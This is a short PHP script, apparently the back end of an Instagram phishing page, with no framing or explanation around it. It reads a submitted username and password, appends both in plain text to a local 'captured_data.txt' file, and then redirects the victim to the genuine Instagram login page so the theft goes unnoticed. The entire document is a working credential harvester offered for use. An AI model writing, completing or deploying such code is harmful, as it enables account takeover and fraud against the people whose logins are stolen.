<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['user'];
    $password = $_POST['pass'];

    // Capture the entered data
    file_put_contents('captured_data.txt', "Username: $username\nPassword: $password\n", FILE_APPEND);

    // Redirect to the legitimate Instagram login page
    header("Location: https://www.instagram.com/accounts/login/");
    exit();
}
?>